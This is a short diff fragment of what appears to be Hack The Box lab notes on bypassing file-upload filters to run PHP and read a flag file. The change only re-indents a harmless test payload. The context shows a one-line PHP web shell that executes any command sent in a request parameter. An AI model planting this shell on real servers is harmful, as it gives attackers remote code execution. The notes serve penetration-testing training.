@@ -7,9 +7,9 @@ Try to bypass both to upload a PHP script and execute code to read "/flag.txt"
 
 ---
 - Test payload:
- ```php
- <?php echo "Hello HTB"; ?>
- ```
+  ```php
+  <?php echo "Hello HTB"; ?>
+  ```
 - PHP shell:
   ```php
   <?php system($_REQUEST['cmd']); ?>
